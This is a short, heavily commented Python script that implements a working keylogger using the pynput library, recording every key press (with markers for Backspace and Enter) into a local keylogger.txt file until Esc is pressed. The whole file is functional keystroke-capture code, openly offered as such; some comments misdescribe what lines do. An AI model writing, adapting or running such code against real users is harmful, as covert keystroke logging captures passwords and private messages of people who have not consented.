#########################################
######  Author - Rahul Virmani  #########
#########################################

import pynput # This library will help us monitoring keyboard input with this library we can store input values of both mouse and keyboard
import logging # This is used for logging and storing the logs
from pynput.keyboard import Key, Listener  # This will import key and listener packages from pynput library.

file_log = "keylogger.txt" # Defining a variable and storing all the logs in this text file. 
words = 0                   # This for setting the counter which increments once the keyboard input is received.
input_key = []             # This is a list to store all the inputs. 

def inputFromUser(event):  # Defining the function to take an input.
    global input_key, words # Making the variables as global so that they are accessible outside the scope.
    input_key.append(event) # Apending the input keys to the list.
    words += 1              # Incrementing the count
    if words >= 1:          # This condition will check if the count is greater or equal to 1.
        words = 0           # Resetting the counter to 0.
        write_file(input_key) # Calling the function to write the input to the file. 
        input_key = []      # Resetting the list once input is apended to the file. 

def write_file(input_key):  # Defining a function to write to a file.
    try:                    # Implementing error handling.
        with open("keylogger.txt","a") as f: # Opening the file in append mode.
            for key in input_key:            # Iteriating over the input list. 
                k = str(key).replace("'", "") # Replacing single quote
                if k.find("space") > 0:       # Checking number of spaces entered.
                        f.write('  ')          # If it find more than one space replace with a tab.
                if str(key) == 'Key.backspace': # Check if user has entered backspace key.
                        f.write(' Backspace is pressed ') #Logging backspace key to the file.
                if str(key) == 'Key.enter':      # Check if user has entered Enter key.
                        f.write(' Enter is pressed ') #Logging Enter key to the file.
                elif k.find("Key") == -1:       # Condition to check if unknown key is pressed or not.
                        f.write(k)              # Write to the file.
    except:                                     # Elegently handling errors
        print("Incorrect format Entered")       # This will print the incorrect format in the terminal and not in the file.
   
def stopListening(event):                       # Defining function to stop the listener.
    if str(event) == 'Key.esc':                 # If esc is pressed end the code.
        print ('Stopping the listener')         
        return False

with Listener(on_press=inputFromUser, on_release=stopListening) as listner: # Collection of all the keyboard events. 
     listner.join()




